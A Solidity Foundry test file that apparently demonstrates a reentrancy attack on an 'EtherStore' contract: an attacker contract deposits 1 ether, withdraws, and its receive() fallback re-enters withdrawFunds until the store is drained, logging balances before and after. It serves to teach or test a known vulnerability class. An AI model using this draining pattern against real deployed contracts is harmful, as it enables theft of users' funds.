// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Reentrancy.sol";

contract ReentrancyExploit is Test {
    EtherStore EtherStoreContract;
    EtherStoreAttack AttackerContract;

    function setUp() public {
        EtherStoreContract = new EtherStore();
        AttackerContract = new EtherStoreAttack(EtherStoreContract);
        vm.deal(address(EtherStoreContract), 5 ether);
        vm.deal(address(AttackerContract), 2 ether);
    }

    function testReentrancy() public {
        AttackerContract.attack();
    }
}

contract EtherStoreAttack {
    EtherStore etherStore;

    constructor(EtherStore _etherStore) {
        etherStore = EtherStore(_etherStore);
    }

    function attack() public payable {
        console.log("EtherStore balance before Attack: ", address(etherStore).balance);
        console.log("Attacker balance before Attack: ", address(this).balance);

        etherStore.depositFunds{value: 1 ether}();
        etherStore.withdrawFunds(1 ether);

        console.log("EtherStore balance after Attack: ", address(etherStore).balance);
        console.log("Attacker balance after Attack: ", address(this).balance);
    }

    receive() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdrawFunds(1 ether);
        }
    }
}
